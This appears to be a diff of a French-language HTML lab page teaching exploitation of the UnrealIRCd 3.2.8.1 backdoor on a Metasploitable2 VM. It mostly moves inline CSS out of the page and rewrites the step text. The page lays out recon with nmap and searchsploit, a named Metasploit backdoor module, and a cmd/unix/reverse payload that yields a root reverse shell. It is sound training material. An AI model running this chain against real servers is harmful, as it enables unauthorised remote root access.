@@ -2,794 +2,11 @@
 <html lang="fr">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <title>UnrealIRCd — Backdoor IRC</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,500;9..144,600&family=IBM+Plex+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
-<style>
-  :root{
-    --bg:#0b0e14;
-    --panel:#12161f;
-    --panel-alt:#161b26;
-    --border:#232937;
-    --text:#e7e9ee;
-    --muted:#8b93a5;
-    --accent:#ff8a5c;
-    --accent-soft:#ff8a5c22;
-    --ok:#5fd9a4;
-    --ok-soft:#5fd9a422;
-    --serif:'Fraunces', serif;
-    --sans:'IBM Plex Sans', sans-serif;
-    --mono:'IBM Plex Mono', monospace;
-  }
-
-  *{box-sizing:border-box;}
-  html{scroll-behavior:smooth;}
-
-  body{
-    margin:0;
-    background:var(--bg);
-    color:var(--text);
-    font-family:var(--sans);
-    line-height:1.6;
-    -webkit-font-smoothing:antialiased;
-  }
-
-  ::selection{background:var(--accent-soft); color:var(--accent);}
-
-  a{color:var(--accent);}
-
-  .wrap{
-    max-width:760px;
-    margin:0 auto;
-    padding:0 24px;
-  }
-
-  /* ---------- HERO ---------- */
-  .hero{
-    padding:96px 0 64px;
-    border-bottom:1px solid var(--border);
-  }
-  .breadcrumb{margin:0 0 18px;}
-  .breadcrumb a{
-    font-family:var(--mono);
-    font-size:13px;
-    color:var(--muted);
-    text-decoration:none;
-    border-bottom:1px solid transparent;
-  }
-  .breadcrumb a:hover{color:var(--accent); border-bottom-color:var(--accent);}
-  .hero .kicker{
-    font-family:var(--mono);
-    font-size:13px;
-    color:var(--accent);
-    margin:0 0 20px;
-  }
-  .hero .kicker::before{content:"$ "; color:var(--muted);}
-  .hero h1{
-    font-family:var(--serif);
-    font-weight:600;
-    font-size:clamp(34px,5vw,52px);
-    line-height:1.1;
-    margin:0 0 20px;
-    letter-spacing:-0.01em;
-  }
-  .hero p.lead{
-    font-size:17px;
-    color:var(--muted);
-    max-width:56ch;
-    margin:0 0 32px;
-  }
-  .meta-row{
-    display:flex;
-    flex-wrap:wrap;
-    gap:28px;
-  }
-  .meta-item{font-size:13px;}
-  .meta-item .label{
-    display:block;
-    color:var(--muted);
-    margin-bottom:4px;
-  }
-  .meta-item .value{
-    font-family:var(--mono);
-    color:var(--text);
-  }
-  .badge{
-    display:inline-block;
-    font-family:var(--mono);
-    font-size:12px;
-    padding:3px 10px;
-    border:1px solid var(--ok);
-    color:var(--ok);
-    border-radius:3px;
-  }
-  .score-badge{
-    display:inline-block;
-    font-family:var(--mono);
-    font-size:12px;
-    padding:3px 10px;
-    border-radius:3px;
-  }
-
-  /* ---------- SECTION GENERIC ---------- */
-  section{
-    padding:64px 0;
-    border-bottom:1px solid var(--border);
-  }
-  section:last-of-type{border-bottom:none;}
-  h2.section-title{
-    font-family:var(--serif);
-    font-weight:600;
-    font-size:28px;
-    margin:0 0 12px;
-  }
-  .section-intro{
-    color:var(--muted);
-    max-width:60ch;
-    margin:0 0 40px;
-    font-size:15px;
-  }
-
-  /* ---------- TIMELINE ---------- */
-  .timeline{
-    position:relative;
-    padding-left:44px;
-  }
-  .timeline::before{
-    content:"";
-    position:absolute;
-    left:15px;
-    top:6px;
-    bottom:6px;
-    width:1px;
-    background:var(--border);
-  }
-  .step{
-    position:relative;
-    margin-bottom:56px;
-  }
-  .step:last-child{margin-bottom:0;}
-  .step-num{
-    position:absolute;
-    left:-44px;
-    top:0;
-    width:32px;
-    height:32px;
-    border-radius:50%;
-    background:var(--panel);
-    border:1px solid var(--border);
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    font-family:var(--mono);
-    font-size:13px;
-    color:var(--accent);
-  }
-  .step h3{
-    font-family:var(--sans);
-    font-weight:600;
-    font-size:19px;
-    margin:2px 0 6px;
-  }
-  .step .step-sub{
-    color:var(--muted);
-    font-size:14px;
-    margin:0 0 18px;
-  }
-
-  /* ---------- TERMINAL BLOCK ---------- */
-  .term{
-    background:var(--panel);
-    border:1px solid var(--border);
-    border-radius:8px;
-    overflow:hidden;
-    margin:0 0 18px;
-  }
-  .term-bar{
-    display:flex;
-    align-items:center;
-    gap:8px;
-    padding:9px 14px;
-    background:var(--panel-alt);
-    border-bottom:1px solid var(--border);
-    font-family:var(--mono);
-    font-size:12px;
-    color:var(--muted);
-  }
-  .term-bar .dot{
-    width:7px; height:7px; border-radius:50%;
-    background:var(--border);
-  }
-  .term pre{
-    margin:0;
-    padding:16px 18px;
-    font-family:var(--mono);
-    font-size:13px;
-    line-height:1.65;
-    overflow-x:auto;
-    white-space:pre-wrap;
-    word-break:break-word;
-  }
-  .term .prompt{color:var(--accent);}
-  .term .out{color:var(--muted);}
-  .term .ok{color:var(--ok);}
-  .term .flag{color:var(--accent);}
-
-  /* ---------- BOUTON COPIER (discret, par commande) ---------- */
-  .copy-btn{
-    display:inline-flex;
-    align-items:center;
-    justify-content:center;
-    width:20px;
-    height:20px;
-    margin-left:8px;
-    padding:0;
-    border:1px solid transparent;
-    border-radius:4px;
-    background:transparent;
-    color:var(--muted);
-    font-size:12px;
-    line-height:1;
-    cursor:pointer;
-    vertical-align:middle;
-    opacity:.55;
-    transition:opacity .15s, border-color .15s, color .15s, background .15s;
-  }
-  .term:hover .copy-btn{opacity:.9;}
-  .copy-btn:hover{opacity:1; border-color:var(--border); background:var(--panel-alt); color:var(--accent);}
-  .copy-btn.copied{opacity:1; border-color:var(--ok); color:var(--ok);}
-
-  /* ---------- EXPLAIN BOX ---------- */
-  .explain{
-    display:grid;
-    grid-template-columns:auto 1fr;
-    gap:10px 12px;
-    background:transparent;
-    border-left:2px solid var(--border);
-    padding:2px 0 2px 18px;
-    margin-top:14px;
-  }
-  .explain .k{
-    font-family:var(--mono);
-    font-size:11px;
-    color:var(--muted);
-    padding-top:2px;
-    white-space:nowrap;
-  }
-  .explain .v{
-    font-size:14.5px;
-    color:var(--text);
-  }
-  .explain .v strong{color:var(--accent); font-weight:600;}
-  .explain .k.err{color:#ff5c72;}
-  .explain .v em.err-em{color:#ff5c72; font-style:normal; font-weight:600;}
-
-  /* ---------- MÉTHODE EXACTE (playbook récapitulatif) ---------- */
-  .playbook{
-    display:flex;
-    flex-direction:column;
-    gap:0;
-    border:1px solid var(--border);
-    border-radius:8px;
-    overflow:hidden;
-    margin-bottom:40px;
-  }
-  .playbook-row{
-    display:grid;
-    grid-template-columns:28px 1fr 1.3fr;
-    gap:16px;
-    padding:14px 18px;
-    border-bottom:1px solid var(--border);
-    background:var(--panel);
-  }
-  .playbook-row:last-child{border-bottom:none;}
-  .playbook-num{
-    font-family:var(--mono);
-    color:var(--accent);
-    font-size:13px;
-  }
-  .playbook-what strong{
-    display:block;
-    font-size:14px;
-    color:var(--text);
-    margin-bottom:3px;
-  }
-  .playbook-what span{
-    font-family:var(--mono);
-    font-size:12px;
-    color:var(--ok);
-  }
-  .playbook-why{
-    font-size:13px;
-    color:var(--muted);
-  }
-  @media (max-width:640px){
-    .playbook-row{grid-template-columns:1fr; gap:4px;}
-    .playbook-num{display:none;}
-  }
-
-  /* ---------- CHEATSHEET TABLE ---------- */
-  .cheat-group{margin-bottom:32px;}
-  .cheat-group h4{
-    font-family:var(--mono);
-    font-size:13px;
-    color:var(--accent);
-    margin:0 0 14px;
-    font-weight:500;
-  }
-  table.cheat{
-    width:100%;
-    border-collapse:collapse;
-    font-size:14px;
-  }
-  table.cheat td{
-    padding:10px 0;
-    border-bottom:1px solid var(--border);
-    vertical-align:top;
-  }
-  table.cheat td.cmd{
-    font-family:var(--mono);
-    color:var(--ok);
-    width:42%;
-    padding-right:20px;
-    white-space:nowrap;
-  }
-  table.cheat td.desc{color:var(--muted);}
-  table.cheat tr:last-child td{border-bottom:none;}
-
-  /* ---------- CONCEPT CARDS ---------- */
-  .concepts{
-    display:flex;
-    flex-direction:column;
-    gap:22px;
-  }
-  .concept{
-    padding:20px 0;
-    border-top:1px solid var(--border);
-  }
-  .concept:first-child{border-top:none; padding-top:0;}
-  .concept h4{
-    font-family:var(--serif);
-    font-weight:600;
-    font-size:18px;
-    margin:0 0 8px;
-  }
-  .concept p{
-    color:var(--muted);
-    margin:0;
-    font-size:14.5px;
-    max-width:62ch;
-  }
-
-  /* ---------- TERMINAL D'ENTRAÎNEMENT ---------- */
-  .practice-wrap{
-    display:flex;
-    flex-direction:column;
-    gap:16px;
-  }
-  .info-bar{
-    display:flex;
-    flex-wrap:wrap;
-    gap:10px 28px;
-    background:var(--panel);
-    border:1px solid var(--border);
-    border-radius:8px;
-    padding:13px 18px;
-    font-family:var(--mono);
-    font-size:12.5px;
-  }
-  .info-bar .item{color:var(--muted);}
-  .info-bar .item strong{color:var(--accent); font-weight:500;}
-
-  .sim{
-    background:var(--panel);
-    border:1px solid var(--border);
-    border-radius:8px;
-    overflow:hidden;
-  }
-  .sim-bar{
-    display:flex;
-    justify-content:space-between;
-    align-items:center;
-    gap:10px;
-    padding:9px 14px;
-    background:var(--panel-alt);
-    border-bottom:1px solid var(--border);
-    font-family:var(--mono);
-    font-size:12px;
-    color:var(--muted);
-  }
-  .sim-progress{color:var(--accent);}
-  .sim-body{
-    padding:16px 18px;
-    font-family:var(--mono);
-    font-size:13px;
-    line-height:1.7;
-    max-height:420px;
-    overflow-y:auto;
-  }
-  .sim-line{margin:0 0 4px; white-space:pre-wrap; word-break:break-word;}
-  .sim-line .p{color:var(--accent);}
-  /* ---------- PROMPT RÉALISTE (style Kali / zsh deux lignes) ---------- */
-  .p-kali{display:inline-flex; flex-direction:column; line-height:1.4; vertical-align:top;}
-  .p-kali .p-user{color:var(--ok); font-weight:600;}
-  .p-kali .p-punc{color:var(--muted);}
-  .p-kali .p-dollar{color:var(--accent); margin-left:4px;}
-  .p-root{color:#ff5c72; font-weight:600;}
-  .p-path{color:#5fbfff;}
-  .sim-line .o{color:var(--muted); display:block;}
-  .sim-line .o.ok{color:var(--ok);}
-  .sim-line .o.err{color:#ff5c72;}
-  .sim-line.appear{animation:fadeSlideIn .3s ease both;}
-  @keyframes fadeSlideIn{
-    from{opacity:0; transform:translateY(4px);}
-    to{opacity:1; transform:translateY(0);}
-  }
-
-  /* ligne mise en valeur pendant la correction */
-  .sim-line.hl{
-    background:rgba(255,138,92,.12);
-    border-radius:4px;
-    padding:2px 6px;
-    margin:0 -6px 4px;
-    animation:pulseGlow 1.3s ease-in-out 2;
-  }
-  @keyframes pulseGlow{
-    0%,100%{box-shadow:0 0 0 rgba(255,138,92,0);}
-    50%{box-shadow:0 0 14px rgba(255,138,92,.45);}
-  }
-
-  /* annotation ajoutée lors d'une correction d'analyse */
-  .sim-annot{
-    margin:2px 0 10px;
-    padding:8px 12px;
-    border-left:2px solid var(--accent);
-    color:var(--accent);
-    font-size:12.5px;
-    background:var(--accent-soft);
-    border-radius:0 6px 6px 0;
-  }
-
-  /* la ligne de saisie vit DANS le flux du terminal, comme un vrai shell —
-     c'est la dernière ligne, elle défile avec le reste, pas de bloc à part */
-  .sim-inputline{
-    display:flex;
-    align-items:center;
-    gap:8px;
-    margin:0 0 4px;
-  }
-  .sim-inputline .p{color:var(--accent); flex-shrink:0;}
-  .sim-input{
-    flex:1;
-    background:transparent;
-    border:none;
-    outline:none;
-    color:var(--text);
-    font-family:var(--mono);
-    font-size:13px;
-    caret-color:var(--accent);
-    padding:0;
-  }
-  .sim-input::placeholder{color:var(--muted); opacity:.6;}
-  .sim-controls{
-    display:flex;
-    align-items:center;
-    gap:8px;
-    padding:10px 18px 16px;
-    border-top:1px solid var(--border);
-    flex-wrap:wrap;
-  }
-  .sim-btn{
-    font-family:var(--mono);
-    font-size:12px;
-    color:var(--text);
-    background:var(--panel-alt);
-    border:1px solid var(--border);
-    border-radius:6px;
-    padding:6px 12px;
-    cursor:pointer;
-    display:inline-flex;
-    align-items:center;
-    gap:6px;
-    transition:border-color .15s, transform .1s;
-  }
-  .sim-btn:hover{border-color:var(--muted); transform:translateY(-1px);}
-  .sim-btn:active{transform:translateY(0);}
-  .sim-btn:disabled{opacity:.3; cursor:default; transform:none;}
-  .sim-btn.continue{border-color:var(--accent); color:var(--accent);}
-
-  .sim-hint-box{
-    margin:0 18px 12px;
-    padding:10px 14px;
-    border-left:2px solid var(--accent);
-    font-size:13px;
-    color:var(--muted);
-    max-height:0;
-    opacity:0;
-    overflow:hidden;
-    transition:max-height .25s ease, opacity .25s ease, padding .25s ease, margin .25s ease;
-  }
-  .sim-hint-box.show{
-    max-height:120px;
-    opacity:1;
-  }
-
-  @media (max-width:640px){
-    .sim-body{max-height:320px;}
-  }
-
-  /* ---------- BOUTON D'OUVERTURE DU TERMINAL ---------- */
-  .term-launch{
-    background:var(--panel);
-    border:1px solid var(--border);
-    border-radius:10px;
-    padding:28px;
-    display:flex;
-    flex-direction:column;
-    align-items:flex-start;
-    gap:12px;
-  }
-  .term-launch-btn{
-    font-family:var(--mono);
-    font-size:14px;
-    font-weight:600;
-    color:#05100b;
-    background:var(--ok);
-    border:none;
-    border-radius:8px;
-    padding:13px 24px;
-    cursor:pointer;
-    display:inline-flex;
-    align-items:center;
-    gap:10px;
-    transition:transform .15s ease, box-shadow .15s ease;
-  }
-  .term-launch-btn:hover{transform:translateY(-1px); box-shadow:0 8px 22px rgba(95,217,164,.28);}
-  .term-launch-btn:active{transform:translateY(0);}
-  .term-launch-dot{
-    width:8px; height:8px; border-radius:50%;
-    background:#05100b;
-    animation:launchBlink 1.6s ease-in-out infinite;
-  }
-  @keyframes launchBlink{0%,100%{opacity:1;} 50%{opacity:.2;}}
-  .term-launch-sub{
-    font-family:var(--mono);
-    font-size:12px;
-    color:var(--muted);
-    margin:0;
-  }
-
-  /* ---------- OVERLAY PLEIN ÉCRAN ---------- */
-  .term-fullscreen{
-    position:fixed;
-    inset:0;
-    z-index:9999;
-    display:none;
-    flex-direction:column;
-    background:radial-gradient(circle at 50% 0%, #131826 0%, #05070a 72%);
-    opacity:0;
-    transform:scale(.98);
-    transition:opacity .22s ease, transform .22s ease;
-  }
-  .term-fullscreen.open{
-    display:flex;
-    opacity:1;
-    transform:scale(1);
-  }
-  .term-fs-header{
-    flex-shrink:0;
-    border-bottom:1px solid var(--border);
-    background:var(--panel);
-    padding:14px 22px 16px;
-  }
-  .term-fs-headrow{
-    display:flex;
-    align-items:center;
-    justify-content:space-between;
-    margin-bottom:12px;
-  }
-  .term-fs-titlebar{
-    display:flex;
-    align-items:center;
-    gap:7px;
-    font-family:var(--mono);
-    font-size:13px;
-    color:var(--muted);
-  }
-  .term-fs-dot{width:9px; height:9px; border-radius:50%; display:inline-block;}
-  .term-fs-dot.r{background:#ff5f57;}
-  .term-fs-dot.y{background:#febc2e;}
-  .term-fs-dot.g{background:#28c840;}
-  .term-fs-context{margin-left:8px; color:var(--text);}
-  .term-fs-close{
-    font-family:var(--mono);
-    font-size:13px;
-    background:transparent;
-    border:1px solid var(--border);
-    color:var(--muted);
-    border-radius:6px;
-    width:30px; height:30px;
-    cursor:pointer;
-    transition:border-color .15s, color .15s, transform .15s;
-  }
-  .term-fs-close:hover{border-color:var(--accent); color:var(--accent); transform:translateY(-1px);}
-  .term-fs-info{
-    display:flex;
-    flex-wrap:wrap;
-    align-items:center;
-    gap:8px 22px;
-    font-family:var(--mono);
-    font-size:12.5px;
-    color:var(--muted);
-    margin-bottom:14px;
-  }
-  .term-fs-info .item strong{color:var(--accent); font-weight:500;}
-
-  /* ---------- CONSIGNE FIXE (toujours visible, comme les infos IP) ---------- */
-  .term-fs-consigne{
-    display:flex;
-    align-items:flex-start;
-    gap:10px;
-    margin-top:14px;
-    padding:10px 12px;
-    background:var(--accent-soft);
-    border:1px solid var(--accent);
-    border-radius:6px;
-  }
-  .consigne-tag{
-    flex-shrink:0;
-    font-family:var(--mono);
-    font-size:10px;
-    letter-spacing:.07em;
-    text-transform:uppercase;
-    color:var(--accent);
-    border:1px solid var(--accent);
-    border-radius:3px;
-    padding:2px 7px;
-    margin-top:1px;
-  }
-  .consigne-text{
-    font-family:var(--sans);
-    font-size:13.5px;
-    color:var(--text);
-    line-height:1.5;
-  }
-  .term-fs-info .item.mode{
-    text-transform:uppercase;
-    letter-spacing:.06em;
-    color:var(--ok);
-    font-size:10.5px;
-    border:1px solid var(--ok);
-    padding:3px 9px;
-    border-radius:3px;
-    transition:color .2s, border-color .2s;
-  }
-  .term-progress{
-    display:flex;
-    align-items:center;
-    gap:14px;
-  }
-  .term-progress-track{
-    flex:1;
-    height:6px;
-    border-radius:3px;
-    background:var(--panel-alt);
-    border:1px solid var(--border);
-    overflow:hidden;
-  }
-  .term-progress-fill{
-    height:100%;
-    width:0%;
-    background:linear-gradient(90deg, var(--ok), var(--accent));
-    border-radius:3px;
-    transition:width .5s cubic-bezier(.4,0,.2,1);
-    box-shadow:0 0 10px rgba(95,217,164,.55);
-  }
-  .term-progress-label{
-    font-family:var(--mono);
-    font-size:11.5px;
-    color:var(--accent);
-    white-space:nowrap;
-  }
-
-  .term-fullscreen .sim-body{
-    flex:1;
-    overflow-y:auto;
-    max-height:none;
-    padding:20px 26px;
-  }
-  .term-fs-footer{
-    flex-shrink:0;
-    border-top:1px solid var(--border);
-    background:var(--panel);
-  }
-  .term-fs-footer .sim-hint-box{margin:10px 22px 0;}
-  .term-fs-footer .sim-controls{padding:10px 22px 14px;}
-
-  /* ---------- FIL D'ARIANE DE MÉTHODE (toujours visible, jamais bloquant) ---------- */
-  .phase-track{
-    display:flex; flex-wrap:wrap; gap:6px;
-    margin-top:12px;
-  }
-  .phase-pill{
-    font-family:var(--mono); font-size:10.5px; letter-spacing:.03em;
-    color:var(--muted); border:1px solid var(--border); border-radius:20px;
-    padding:4px 10px; transition:color .2s, border-color .2s, background .2s;
-  }
-  .phase-pill.active{
-    color:var(--accent); border-color:var(--accent); background:var(--accent-soft);
-  }
-
-  /* ---------- CARNET DE MISSION (jamais bloquant : pas de dimmed, pas de clic forcé pour continuer) ---------- */
-  .notebook-btn{
-    font-family:var(--mono); font-size:12px; color:var(--muted);
-    background:var(--panel-alt); border:1px solid var(--border); border-radius:6px;
-    padding:6px 12px; cursor:pointer; display:inline-flex; align-items:center; gap:6px;
-    transition:border-color .15s, color .15s;
-  }
-  .notebook-btn:hover{border-color:var(--accent); color:var(--accent);}
-  .notebook-panel{
-    display:none; flex-direction:column; gap:10px;
-    margin:12px 22px 0; padding:14px 16px; max-height:260px; overflow-y:auto;
-    border-radius:10px; border:1px solid var(--border); background:var(--panel-alt);
-  }
-  .notebook-panel.show{display:flex;}
-  .notebook-empty{font-size:12.5px; color:var(--muted); margin:0;}
-  .notebook-item{border-left:2px solid var(--accent); padding-left:10px;}
-  .notebook-item .nb-cmd{
-    font-family:var(--mono); font-size:12px; color:var(--text); margin-bottom:2px;
-  }
-  .notebook-item .nb-note{font-size:12.5px; color:var(--muted); line-height:1.5;}
-
-  /* ---------- INDICE (deux niveaux) ---------- */
-  .hint-more{
-    display:inline-block; margin-left:8px;
-    font-family:var(--mono); font-size:11px; color:var(--accent);
-    background:transparent; border:1px solid var(--accent); border-radius:12px;
-    padding:2px 9px; cursor:pointer;
-  }
-  .hint-more:hover{background:var(--accent-soft);}
-
-  /* animation sobre au passage d'une étape à l'autre */
-  @keyframes successFlash{
-    0%{box-shadow:inset 0 0 0 rgba(95,217,164,0);}
-    35%{box-shadow:inset 0 0 46px rgba(95,217,164,.16);}
-    100%{box-shadow:inset 0 0 0 rgba(95,217,164,0);}
-  }
-  .sim-body.flash-ok{animation:successFlash .65s ease;}
-
-  @keyframes progressPulse{
-    0%,100%{box-shadow:0 0 10px rgba(95,217,164,.55);}
-    50%{box-shadow:0 0 18px rgba(95,217,164,.85);}
-  }
-  .term-progress-fill.pulse{animation:progressPulse .65s ease;}
-
-  /* ---------- FOOTER ---------- */
-  footer{
-    padding:48px 0 80px;
-  }
-  footer .note{
-    font-family:var(--mono);
-    font-size:12.5px;
-    color:var(--muted);
-    border:1px solid var(--border);
-    border-radius:8px;
-    padding:16px 18px;
-    background:var(--panel);
-  }
-  footer .note .ok{color:var(--ok);}
-
-  @media (max-width:600px){
-    .hero{padding:64px 0 48px;}
-    .timeline{padding-left:34px;}
-    .step-num{left:-34px; width:26px; height:26px; font-size:11px;}
-    .explain{grid-template-columns:1fr;}
-    .explain .k{padding-top:0;}
-    .practice-wrap{grid-template-columns:1fr;}
-    .info-panel{position:static;}
-  }
-</style>
+<link rel="stylesheet" href="lab.css">
 </head>
 <body>
 
@@ -798,7 +15,7 @@
       <p class="breadcrumb"><a href="index.html">← Hub</a></p>
       <p class="kicker">metasploitable2 :: recon → exploit → post-exploit</p>
       <h1>UnrealIRCd<br>Backdoor IRC</h1>
-      <p class="lead">Quatrième exploit du lab. Même famille d'incident que vsftpd : une archive officielle piégée. Cette fois sur un serveur IRC, et avec une commande magique qui déclenche l'exécution à distance.</p>
+      <p class="lead">Même famille d'incident que vsftpd : une archive officielle piégée. Cette fois sur un serveur IRC, avec une commande magique qui déclenche l'exécution à distance.</p>
       <div class="meta-row">
         <div class="meta-item"><span class="label">Cible</span><span class="value">Metasploitable2 · 192.168.56.20</span></div>
         <div class="meta-item"><span class="label">Attaquant</span><span class="value">Kali Linux · 192.168.56.10</span></div>
@@ -813,39 +30,39 @@
   <div class="wrap">
     <section id="chrono">
       <h2 class="section-title">Chronologie</h2>
-      <p class="section-intro">Six étapes : reconnaissance ciblée, recherche d'exploit, chargement du module, puis vérification de l'accès root obtenu.</p>
+      <p class="section-intro">Six étapes : reconnaissance, choix du port, recherche d'exploit, chargement du module, configuration, exploitation et vérification.</p>
 
       <h4 style="font-family:var(--mono); font-size:13px; color:var(--accent); margin:0 0 14px; font-weight:500;">Méthode exacte, en un coup d'œil</h4>
       <div class="playbook">
         <div class="playbook-row">
           <div class="playbook-num">1</div>
-          <div class="playbook-what"><strong>Reconnaissance ciblée</strong><span>nmap -sV -p 6667</span></div>
-          <div class="playbook-why">Identifier précisément le service IRC et sa version — c'est la version exacte qui détermine s'il existe une backdoor connue.</div>
+          <div class="playbook-what"><strong>Reconnaissance</strong><span>nmap -sV -sC</span></div>
+          <div class="playbook-why">Lister tous les services. Repérer UnrealIRCd 3.2.8.1 sur le port 6667.</div>
         </div>
         <div class="playbook-row">
           <div class="playbook-num">2</div>
-          <div class="playbook-what"><strong>Recherche d'exploit</strong><span>searchsploit unrealircd</span></div>
-          <div class="playbook-why">Croiser la version repérée (3.2.8.1) avec la base d'exploits publics — la backdoor de 2009-2010 est documentée.</div>
+          <div class="playbook-what"><strong>Choix du port</strong><span>reconnaissance visuelle</span></div>
+          <div class="playbook-why">Version précise connue pour une backdoor injectée dans l'archive officielle (2009-2010).</div>
         </div>
         <div class="playbook-row">
           <div class="playbook-num">3</div>
-          <div class="playbook-what"><strong>Sélection du module</strong><span>msfconsole / search / use</span></div>
-          <div class="playbook-why">Charger le module backdoor correspondant à la version vue par nmap, avec un payload adapté (cmd/unix/reverse).</div>
+          <div class="playbook-what"><strong>Recherche d'exploit</strong><span>searchsploit unrealircd</span></div>
+          <div class="playbook-why">Croiser la version exacte avec la base d'exploits publics.</div>
         </div>
         <div class="playbook-row">
           <div class="playbook-num">4</div>
-          <div class="playbook-what"><strong>Configuration</strong><span>set RHOSTS / set LHOST / set PAYLOAD</span></div>
-          <div class="playbook-why">Renseigner la cible, l'adresse de retour du reverse shell, et le payload adapté au service (shell Unix brut, pas meterpreter).</div>
+          <div class="playbook-what"><strong>Chargement du module</strong><span>msfconsole / search / use</span></div>
+          <div class="playbook-why">Charger exploit/unix/irc/unreal_ircd_3281_backdoor.</div>
         </div>
         <div class="playbook-row">
           <div class="playbook-num">5</div>
-          <div class="playbook-what"><strong>Exploitation</strong><span>run</span></div>
-          <div class="playbook-why">Déclencher le module — la backdoor est activée par un message IRC piégé qui déclenche l'exécution du payload.</div>
+          <div class="playbook-what"><strong>Configuration</strong><span>set payload / RHOSTS / LHOST</span></div>
+          <div class="playbook-why">Payload shell Unix brut (cmd/unix/reverse), pas meterpreter.</div>
         </div>
         <div class="playbook-row">
           <div class="playbook-num">6</div>
-          <div class="playbook-what"><strong>Post-exploitation immédiate</strong><span>id</span></div>
-          <div class="playbook-why">Vérifier l'identité obtenue. Le service tourne en root : l'accès est direct à uid=0.</div>
+          <div class="playbook-what"><strong>Exploitation</strong><span>run</span></div>
+          <div class="playbook-why">Déclencher la backdoor, vérifier l'accès root obtenu.</div>
         </div>
       </div>
 
@@ -853,109 +70,115 @@
 
         <div class="step">
           <div class="step-num">1</div>
-          <h3>Reconnaissance ciblée — nmap</h3>
-          <p class="step-sub">Un seul port, mais le service et sa version exacte sont indispensables avant toute recherche d'exploit.</p>
+          <h3>Reconnaissance complète — nmap</h3>
+          <p class="step-sub">Lister tous les ports ouverts. On trie ensuite.</p>
           <div class="term">
             <div class="term-bar"><span class="dot"></span>kali@kali</div>
-            <pre><span class="prompt">$</span> nmap -sV -p 6667 192.168.56.20<button class="copy-btn" type="button" data-copy="nmap -sV -p 6667 192.168.56.20" aria-label="Copier la commande" title="Copier">⧉</button>
-<span class="out">PORT     STATE SERVICE VERSION</span>
-<span class="out">6667/tcp open  irc     UnrealIRCd 3.2.8.1</span></pre>
+            <pre><span class="prompt">$</span> nmap -sV -sC 192.168.56.20<button class="copy-btn" type="button" data-copy="nmap -sV -sC 192.168.56.20" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">PORT     STATE SERVICE     VERSION</span>
+<span class="out">21/tcp   open  ftp         vsftpd 2.3.4</span>
+<span class="out">22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1</span>
+<span class="out">23/tcp   open  telnet      Linux telnetd</span>
+<span class="out">80/tcp   open  http        Apache httpd 2.2.8</span>
+<span class="out">111/tcp  open  rpcbind     2 (RPC #100000)</span>
+<span class="out">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X</span>
+<span class="out">445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian</span>
+<span class="out">1524/tcp open  ingreslock?</span>
+<span class="out">2049/tcp open  nfs         2-4 (RPC #100003)</span>
+<span class="out">3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5</span>
+<span class="out">5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7</span>
+<span class="out">5900/tcp open  vnc         VNC (protocol 3.3)</span>
+<span class="out">6667/tcp open  irc         UnrealIRCd 3.2.8.1</span>
+<span class="out">8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1</span></pre>
           </div>
           <div class="explain">
-            <span class="k">-p 6667</span><span class="v">cible précisément le port IRC — un scan complet aurait aussi trouvé ce service, mais cibler le port directement simplifie la sortie pour la démonstration.</span>
-            <span class="k">version</span><span class="v">UnrealIRCd <strong>3.2.8.1</strong> — c'est cette version exacte qui détermine si la backdoor est présente ou non.</span>
+            <span class="k">-sV</span><span class="v">versions exactes — indispensables : une backdoor cible une version précise.</span>
+            <span class="k">-sC</span><span class="v">scripts NSE par défaut.</span>
+            <span class="k">triage</span><span class="v">On cherche un service dont la version exacte est documentée comme vulnérable.</span>
           </div>
         </div>
 
         <div class="step">
           <div class="step-num">2</div>
-          <h3>Recherche d'exploit — searchsploit</h3>
-          <p class="step-sub">Croiser la version vue par nmap avec la base d'exploits publics.</p>
+          <h3>Choix du port à cibler</h3>
+          <p class="step-sub">Un service avec une version très précise : UnrealIRCd 3.2.8.1.</p>
           <div class="term">
-            <div class="term-bar"><span class="dot"></span>kali@kali</div>
-            <pre><span class="prompt">$</span> searchsploit unrealircd<button class="copy-btn" type="button" data-copy="searchsploit unrealircd" aria-label="Copier la commande" title="Copier">⧉</button>
-<span class="out">------------------------------------------------------- ---------------------------------</span>
-<span class="out"> Exploit Title                                         |  Path</span>
-<span class="out">------------------------------------------------------- ---------------------------------</span>
-<span class="out">UnrealIRCd 3.2.8.1 - Backdoor Command Execution        | linux/remote/16921.rb</span>
-<span class="out">UnrealIRCd 3.2.8.1 - Backdoor Command Execution (MSF)  | linux/remote/17900.rb</span>
-<span class="out">------------------------------------------------------- ---------------------------------</span>
-<span class="out">Shellcodes: No Results</span></pre>
+            <div class="term-bar"><span class="dot"></span>rappel de la sortie nmap</div>
+            <pre><span class="out">6667/tcp open  irc         UnrealIRCd 3.2.8.1</span></pre>
           </div>
           <div class="explain">
-            <span class="k">deux résultats</span><span class="v">le premier (16921.rb) est un script Ruby générique ; le second (17900.rb) est <strong>déjà intégré à Metasploit</strong>. C'est celui-ci qu'il faut charger.</span>
-            <span class="k">.rb</span><span class="v">module Ruby prêt pour msfconsole — pas d'adaptation nécessaire, on le charge directement via <strong>use exploit/unix/irc/unreal_ircd_3281_backdoor</strong>.</span>
+            <span class="k">indice</span><span class="v">3.2.8.1 — c'est cette version exacte qui a été piégée par une backdoor dans l'archive officielle entre 2009 et 2010.</span>
+            <span class="k">à retenir</span><span class="v">Une version très précise, isolée sur un port, est un signal fort qu'un exploit documenté existe.</span>
           </div>
         </div>
 
         <div class="step">
           <div class="step-num">3</div>
-          <h3>Le bon module — msfconsole</h3>
-          <p class="step-sub">UnrealIRCd 3.2.8.1 est un cas connu : une backdoor a été injectée dans l'archive officielle téléchargeable entre 2009 et 2010. Elle s'active quand un message IRC commence par une séquence précise.</p>
+          <h3>Recherche d'exploit — searchsploit</h3>
           <div class="term">
             <div class="term-bar"><span class="dot"></span>kali@kali</div>
